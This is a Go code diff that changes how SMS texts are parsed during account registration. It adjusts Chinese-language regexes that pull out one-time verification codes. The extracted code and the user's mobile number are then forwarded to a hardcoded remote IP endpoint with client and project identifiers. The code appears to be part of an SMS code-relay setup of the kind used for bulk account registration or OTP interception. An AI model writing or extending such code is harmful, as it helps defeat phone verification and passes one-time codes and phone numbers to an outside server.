@@ -230,16 +230,20 @@ func processTianyiRegister(msg string, user map[string]string, apid string) {
 }
 func processGtjaRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
-	exp := regexp.MustCompile(`码：(\S*)，感谢`)
+	exp := regexp.MustCompile(`码(\S*)，请勿`)
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
 		log.Println(result[1])
-		url := "http://121.201.67.189:9876/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://121.201.67.189:9876/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent2=" + result[1] + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
-
 	} else {
-		url := "http://121.201.67.189:9876/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
-		go send2Url(url)
+		exp = regexp.MustCompile(`码：(\S*)。请确保`)
+		result = exp.FindStringSubmatch(msg)
+		if nil != result {
+			url := "http://121.201.67.189:9876/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent=" + result[1] + "&mobile=" + mobile + "&ccpara="
+			go send2Url(url)
+		}
+
 	}
 	go updateRelationSuccess(user, apid)
 }
